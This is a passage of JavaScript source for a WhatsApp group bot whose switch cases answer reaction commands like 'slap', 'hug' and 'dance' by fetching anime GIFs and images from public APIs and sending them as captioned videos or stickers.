           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'animeawoo':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
